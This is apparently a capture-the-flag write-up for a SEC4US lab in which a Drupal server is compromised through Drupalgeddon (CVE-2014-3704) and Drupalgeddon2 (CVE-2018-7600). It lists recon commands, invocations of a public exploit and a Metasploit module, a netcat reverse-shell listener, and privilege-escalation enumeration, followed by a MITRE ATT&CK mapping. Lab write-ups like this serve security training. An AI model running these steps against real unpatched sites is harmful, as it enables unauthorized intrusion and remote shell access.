# maq149: CMS Drupal Server

Writeup for the **CMS Drupal Server** challenge on [SEC4US](https://sec4us.com.br/).

> **Category:** Web Hacking  
> **Difficulty:** Easy  
> **Points:** 149

---

## Overview

A Drupal CMS instance is vulnerable to Drupalgeddon (CVE-2014-3704) or Drupalgeddon2 (CVE-2018-7600), enabling unauthenticated remote code execution through SQL injection or improper input handling in the Form API.

## Reconnaissance

Enumerate the target:

```bash
nmap -sC -sV -p- <TARGET_IP>
```

Identify Drupal and its version:

```bash
curl http://<TARGET_IP>/CHANGELOG.txt
droopescan scan drupal -u http://<TARGET_IP>
```

## Exploitation

### Step 1: Confirm Drupal Version

Read the CHANGELOG.txt or use droopescan to determine the exact version and assess which Drupalgeddon variant applies.

### Step 2: Exploit Drupalgeddon

For Drupalgeddon2 (CVE-2018-7600), use the public exploit:

```bash
python3 drupalgeddon2.py http://<TARGET_IP>
```

Alternatively, use Metasploit:

```bash
use exploit/unix/webapp/drupal_drupalgeddon2
set RHOSTS <TARGET_IP>
run
```

### Step 3: Establish Persistent Access

Upgrade to a stable reverse shell:

```bash
nc -lvnp 4444
```

Execute a reverse shell command from the initial RCE.

### Step 4: Retrieve the Flag

Search the filesystem for the flag file and read its contents.

## Privilege Escalation

Enumerate the target for privilege escalation:

```bash
sudo -l
find / -perm -4000 -type f 2>/dev/null
cat /etc/crontab
```

## Security Framework Mapping

### MITRE ATT&CK

| Technique                         | ID        |
|-----------------------------------|-----------|
| Exploit Public-Facing Application | T1190     |
| Command and Scripting Interpreter | T1059     |
| File and Directory Discovery      | T1083     |

### CWE

- **CWE-89:** SQL Injection (Drupalgeddon 1)
- **CWE-94:** Code Injection (Drupalgeddon 2)

### CVE

- **CVE-2014-3704:** Drupalgeddon
- **CVE-2018-7600:** Drupalgeddon2

---

Drupal powers governments and universities, yet a single unpatched form handler turns institutional trust into an attacker's foothold.

```
(❍ᴥ❍ʋ)
```

- Instagram: https://www.instagram.com/uniaogeek
- LinkedIn: http://linkedin.com/in/mrhenrike
- X: https://x.com/mrhenrike
